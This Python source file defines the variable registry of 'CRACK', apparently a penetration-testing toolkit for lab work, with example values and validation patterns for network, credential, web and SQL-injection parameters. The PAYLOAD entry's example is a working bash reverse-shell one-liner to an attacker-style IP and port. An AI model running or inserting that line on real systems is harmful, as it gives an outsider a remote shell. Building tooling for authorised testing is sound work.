"""
Variable definitions for CRACK configuration system

All variables are defined here as the single source of truth.
Each variable includes metadata, validation patterns, and examples.
"""

from dataclasses import dataclass, field
from typing import Optional, List, Pattern, Callable
import re


@dataclass
class Variable:
    """Variable definition with metadata and validation"""
    name: str                               # Variable name (no angle brackets)
    category: str                           # Category: network, web, credentials, etc.
    description: str                        # Clear description of purpose
    example: str                            # Default/example value
    required: bool = False                  # Must be set before use?
    validation: Optional[Pattern] = None    # Regex validation pattern
    auto_detect: Optional[str] = None       # Method name for auto-detection
    aliases: List[str] = field(default_factory=list)  # Alternative names


# ============================================================================
# VARIABLE REGISTRY - Single Source of Truth
# ============================================================================

VARIABLE_REGISTRY = {

    # ========================================================================
    # NETWORK VARIABLES
    # ========================================================================
    'LHOST': Variable(
        name='LHOST',
        category='network',
        description='Local/attacker IP address (your machine)',
        example='10.10.14.5',
        required=True,
        validation=re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'),
        auto_detect='detect_ip'
    ),

    'LPORT': Variable(
        name='LPORT',
        category='network',
        description='Local port for listener/callback',
        example='4444',
        required=False,
        validation=re.compile(r'^\d{1,5}$')
    ),

    'TARGET': Variable(
        name='TARGET',
        category='network',
        description='Target machine IP address',
        example='192.168.45.100',
        required=False,
        validation=re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    ),

    'TARGET_SUBNET': Variable(
        name='TARGET_SUBNET',
        category='network',
        description='Target subnet in CIDR notation',
        example='192.168.45.0/24',
        required=False,
        validation=re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$')
    ),

    'INTERFACE': Variable(
        name='INTERFACE',
        category='network',
        description='Network interface (tun0, eth0, wlan0)',
        example='tun0',
        required=False,
        auto_detect='detect_interface'
    ),

    'PORT': Variable(
        name='PORT',
        category='network',
        description='Target port number',
        example='80',
        required=False,
        validation=re.compile(r'^\d{1,5}$')
    ),

    'PORTS': Variable(
        name='PORTS',
        category='network',
        description='Port range or comma-separated ports',
        example='1-65535',
        required=False
    ),

    'IP': Variable(
        name='IP',
        category='network',
        description='Generic IP address',
        example='192.168.1.1',
        required=False,
        validation=re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    ),

    'SUBNET': Variable(
        name='SUBNET',
        category='network',
        description='Network subnet in CIDR notation',
        example='192.168.1.0/24',
        required=False,
        validation=re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$')
    ),

    'NAMESERVER': Variable(
        name='NAMESERVER',
        category='network',
        description='DNS nameserver IP address',
        example='8.8.8.8',
        required=False,
        validation=re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'),
        aliases=['NS']
    ),

    'DOMAIN': Variable(
        name='DOMAIN',
        category='network',
        description='Target domain name',
        example='example.com',
        required=False,
        validation=re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?(\.[a-zA-Z]{2,})+$')
    ),

    'DISCOVERED_IP': Variable(
        name='DISCOVERED_IP',
        category='network',
        description='IP address discovered during enumeration',
        example='192.168.1.50',
        required=False,
        validation=re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    ),

    # ========================================================================
    # WEB VARIABLES
    # ========================================================================
    'URL': Variable(
        name='URL',
        category='web',
        description='Target URL (include http:// or https://)',
        example='http://192.168.45.100',
        required=False,
        validation=re.compile(r'^https?://[^\s]+$')
    ),

    'WORDLIST': Variable(
        name='WORDLIST',
        category='web',
        description='Path to wordlist file',
        example='/usr/share/wordlists/dirb/common.txt',
        required=False,
        validation=re.compile(r'^/.*\.txt$')
    ),

    'EXTENSIONS': Variable(
        name='EXTENSIONS',
        category='web',
        description='File extensions to search (comma-separated)',
        example='php,html,txt',
        required=False
    ),

    'THREADS': Variable(
        name='THREADS',
        category='web',
        description='Number of threads for scanning',
        example='10',
        required=False,
        validation=re.compile(r'^\d+$')
    ),

    'RATE': Variable(
        name='RATE',
        category='web',
        description='Request rate limit (requests/second)',
        example='50',
        required=False,
        validation=re.compile(r'^\d+$')
    ),

    'WPSCAN_API_TOKEN': Variable(
        name='WPSCAN_API_TOKEN',
        category='web',
        description='WPScan API token from wpscan.com (for vulnerability data)',
        example='',
        required=False,
        validation=re.compile(r'^[A-Za-z0-9_-]{40,}$'),
        aliases=['API_TOKEN']
    ),

    'SESSION_TOKEN': Variable(
        name='SESSION_TOKEN',
        category='web',
        description='Session/authentication token',
        example='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
        required=False,
        aliases=['TOKEN']
    ),

    'PARAM': Variable(
        name='PARAM',
        category='web',
        description='URL parameter name',
        example='id',
        required=False
    ),

    'METHOD': Variable(
        name='METHOD',
        category='web',
        description='HTTP method (GET, POST, PUT, DELETE)',
        example='GET',
        required=False,
        validation=re.compile(r'^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)$')
    ),

    'CMS': Variable(
        name='CMS',
        category='web',
        description='Content Management System name',
        example='wordpress',
        required=False
    ),

    'PLUGIN': Variable(
        name='PLUGIN',
        category='web',
        description='Plugin/module name',
        example='wp-file-manager',
        required=False
    ),

    # ========================================================================
    # CREDENTIALS VARIABLES
    # ========================================================================
    'USERNAME': Variable(
        name='USERNAME',
        category='credentials',
        description='Username for authentication',
        example='admin',
        required=False,
        aliases=['USER']
    ),

    'PASSWORD': Variable(
        name='PASSWORD',
        category='credentials',
        description='Password for authentication',
        example='password123',
        required=False,
        aliases=['PASS']
    ),

    'CREDFILE': Variable(
        name='CREDFILE',
        category='credentials',
        description='Path to credentials file (username:password format)',
        example='/usr/share/wordlists/creds.txt',
        required=False,
        validation=re.compile(r'^/.*\.txt$')
    ),

    'USERS': Variable(
        name='USERS',
        category='credentials',
        description='Path to username list',
        example='/usr/share/wordlists/users.txt',
        required=False,
        validation=re.compile(r'^/.*\.txt$')
    ),

    'LM_HASH': Variable(
        name='LM_HASH',
        category='credentials',
        description='LAN Manager hash',
        example='aad3b435b51404eeaad3b435b51404ee',
        required=False,
        validation=re.compile(r'^[a-fA-F0-9]{32}$'),
        aliases=['LM']
    ),

    'NTLM_HASH': Variable(
        name='NTLM_HASH',
        category='credentials',
        description='NTLM hash',
        example='8846f7eaee8fb117ad06bdd830b7586c',
        required=False,
        validation=re.compile(r'^[a-fA-F0-9]{32}$'),
        aliases=['NTLM']
    ),

    # ========================================================================
    # ENUMERATION VARIABLES
    # ========================================================================
    'SNMP_COMMUNITY': Variable(
        name='SNMP_COMMUNITY',
        category='enumeration',
        description='SNMP community string (often "public" or "private")',
        example='public',
        required=False,
        aliases=['COMMUNITY']
    ),

    'SHARE': Variable(
        name='SHARE',
        category='enumeration',
        description='SMB/NFS share name',
        example='shared',
        required=False
    ),

    'SERVICE': Variable(
        name='SERVICE',
        category='enumeration',
        description='Service name or type',
        example='ssh',
        required=False
    ),

    'SERVICE_NAME': Variable(
        name='SERVICE_NAME',
        category='enumeration',
        description='Specific service name',
        example='apache2',
        required=False
    ),

    'VERSION': Variable(
        name='VERSION',
        category='enumeration',
        description='Software version number',
        example='2.4.41',
        required=False
    ),

    'SERVER_VERSION': Variable(
        name='SERVER_VERSION',
        category='enumeration',
        description='Server software version',
        example='Apache/2.4.41',
        required=False
    ),

    'SERVICE_PRINCIPAL_NAME': Variable(
        name='SERVICE_PRINCIPAL_NAME',
        category='enumeration',
        description='Kerberos Service Principal Name',
        example='HTTP/web01.domain.local',
        required=False,
        aliases=['SPN']
    ),

    # ========================================================================
    # EXPLOITATION VARIABLES
    # ========================================================================
    'PAYLOAD': Variable(
        name='PAYLOAD',
        category='exploitation',
        description='Exploit payload or command to execute',
        example='bash -i >& /dev/tcp/10.10.14.5/4444 0>&1',
        required=False
    ),

    'CVE_ID': Variable(
        name='CVE_ID',
        category='exploitation',
        description='CVE identifier',
        example='CVE-2021-44228',
        required=False,
        validation=re.compile(r'^CVE-\d{4}-\d{4,}$'),
        aliases=['CVE']
    ),

    'EDB_ID': Variable(
        name='EDB_ID',
        category='exploitation',
        description='Exploit-DB ID number',
        example='50383',
        required=False,
        validation=re.compile(r'^\d+$')
    ),

    'SEARCH_TERM': Variable(
        name='SEARCH_TERM',
        category='exploitation',
        description='Search term for exploit lookup',
        example='apache 2.4',
        required=False
    ),

    # ========================================================================
    # FILE TRANSFER VARIABLES
    # ========================================================================
    'FILE': Variable(
        name='FILE',
        category='file-transfer',
        description='File name',
        example='exploit.sh',
        required=False
    ),

    'FILENAME': Variable(
        name='FILENAME',
        category='file-transfer',
        description='Full file name with extension',
        example='linpeas.sh',
        required=False
    ),

    'LOCAL_PATH': Variable(
        name='LOCAL_PATH',
        category='file-transfer',
        description='Local file system path',
        example='/home/kali/tools',
        required=False,
        validation=re.compile(r'^/.*$')
    ),

    'PATH': Variable(
        name='PATH',
        category='file-transfer',
        description='File or directory path',
        example='/tmp',
        required=False
    ),

    'OUTPUT_FILE': Variable(
        name='OUTPUT_FILE',
        category='file-transfer',
        description='Output file path',
        example='output.txt',
        required=False
    ),

    'OUTPUT_DIR': Variable(
        name='OUTPUT_DIR',
        category='file-transfer',
        description='Output directory path',
        example='./scans',
        required=False
    ),

    'SERVER': Variable(
        name='SERVER',
        category='file-transfer',
        description='Server address or hostname',
        example='192.168.45.100',
        required=False
    ),

    'MOUNT_POINT': Variable(
        name='MOUNT_POINT',
        category='file-transfer',
        description='Directory mount point',
        example='/mnt/share',
        required=False,
        validation=re.compile(r'^/.*$')
    ),

    # ========================================================================
    # SQL INJECTION VARIABLES
    # ========================================================================
    'DATABASE': Variable(
        name='DATABASE',
        category='sql-injection',
        description='Database name',
        example='mysql',
        required=False,
        aliases=['DB']
    ),

    'NULL_COLUMNS': Variable(
        name='NULL_COLUMNS',
        category='sql-injection',
        description='Null values for UNION SQLi column padding',
        example='NULL,NULL,NULL',
        required=False
    ),

    'EMPTY_COLS': Variable(
        name='EMPTY_COLS',
        category='sql-injection',
        description='Number of empty columns for UNION SQLi',
        example='3',
        required=False,
        validation=re.compile(r'^\d+$')
    ),

    'MAX_COLS': Variable(
        name='MAX_COLS',
        category='sql-injection',
        description='Maximum number of columns to test in UNION SQLi',
        example='10',
        required=False,
        validation=re.compile(r'^\d+$')
    ),

    # ========================================================================
    # MISCELLANEOUS VARIABLES
    # ========================================================================
    'OUTPUT': Variable(
        name='OUTPUT',
        category='misc',
        description='Generic output specification',
        example='results.txt',
        required=False
    ),

    'DIR': Variable(
        name='DIR',
        category='misc',
        description='Directory path',
        example='/var/www/html',
        required=False
    ),

    'FOUND_DIR': Variable(
        name='FOUND_DIR',
        category='misc',
        description='Directory discovered during enumeration',
        example='/admin',
        required=False
    ),

    'NAME': Variable(
        name='NAME',
        category='misc',
        description='Generic name field',
        example='backup',
        required=False
    ),

    'ID': Variable(
        name='ID',
        category='misc',
        description='Generic ID field',
        example='1',
        required=False
    ),

    'VALUE': Variable(
        name='VALUE',
        category='misc',
        description='Generic value field',
        example='test',
        required=False
    ),

    'SIZE': Variable(
        name='SIZE',
        category='misc',
        description='Size specification',
        example='1024',
        required=False,
        validation=re.compile(r'^\d+$')
    ),

    'RANGE': Variable(
        name='RANGE',
        category='misc',
        description='Range specification',
        example='1-100',
        required=False
    ),

    'DATE': Variable(
        name='DATE',
        category='misc',
        description='Date specification',
        example='2025-01-01',
        required=False,
        validation=re.compile(r'^\d{4}-\d{2}-\d{2}$')
    ),

    'SCRIPT': Variable(
        name='SCRIPT',
        category='misc',
        description='Script name or path',
        example='script.sh',
        required=False
    ),

    'SCRIPT_NAME': Variable(
        name='SCRIPT_NAME',
        category='misc',
        description='Nmap NSE script name',
        example='http-vuln-cve2021-44228',
        required=False
    ),

    'ARGUMENTS': Variable(
        name='ARGUMENTS',
        category='misc',
        description='Command arguments',
        example='--verbose --force',
        required=False,
        aliases=['ARGS']
    ),

    'OPTIONS': Variable(
        name='OPTIONS',
        category='misc',
        description='Additional options/flags',
        example='-v -d',
        required=False
    ),

    'BLACKLIST': Variable(
        name='BLACKLIST',
        category='misc',
        description='Comma-separated blacklist',
        example='401,403,404',
        required=False
    ),

    'DEST': Variable(
        name='DEST',
        category='misc',
        description='Destination path or address',
        example='/tmp/output',
        required=False
    ),

    'THEME': Variable(
        name='THEME',
        category='misc',
        description='TUI theme name',
        example='oscp',
        required=False
    ),
}


def get_by_category(category: str) -> dict:
    """Get all variables in a specific category"""
    return {
        name: var for name, var in VARIABLE_REGISTRY.items()
        if var.category == category
    }


def get_all_categories() -> list:
    """Get list of all unique categories"""
    return sorted(set(var.category for var in VARIABLE_REGISTRY.values()))


def resolve_alias(name: str) -> str:
    """Resolve an alias to its canonical variable name"""
    name = name.strip('<>').upper()

    # Check if it's already a canonical name
    if name in VARIABLE_REGISTRY:
        return name

    # Search aliases
    for var_name, var in VARIABLE_REGISTRY.items():
        if name in var.aliases:
            return var_name

    # Not found, return original
    return name


def get_variable_info(name: str) -> Optional[Variable]:
    """Get variable definition by name or alias"""
    canonical = resolve_alias(name)
    return VARIABLE_REGISTRY.get(canonical)
